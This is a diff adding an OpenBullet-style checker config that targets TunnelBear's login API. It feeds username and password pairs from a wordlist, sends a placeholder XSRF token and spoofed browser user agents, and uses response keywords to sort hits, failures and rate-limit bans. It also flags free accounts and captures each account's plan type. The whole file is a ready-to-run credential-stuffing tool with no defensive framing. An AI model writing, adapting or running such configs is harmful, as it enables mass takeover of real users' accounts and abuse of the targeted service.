@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "bear",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-18T20:19:48.2363185-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.tunnelbear.com/core/api/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Rate limiting" 
+
+REQUEST POST "https://www.tunnelbear.com/core/api/login" 
+  CONTENT "username=<USER>&password=<PASS>&withUserDetails=true&v=web-1.0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-XSRF-TOKEN: 123456" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "result\":\"PASS\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "Access denied" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\",\"paymentStatus\":\"FREE" 
+  KEYCHAIN Ban OR 
+    KEY "Rate limiting" 
+
+PARSE "<SOURCE>" JSON "bearType" -> CAP "BearType" 
+
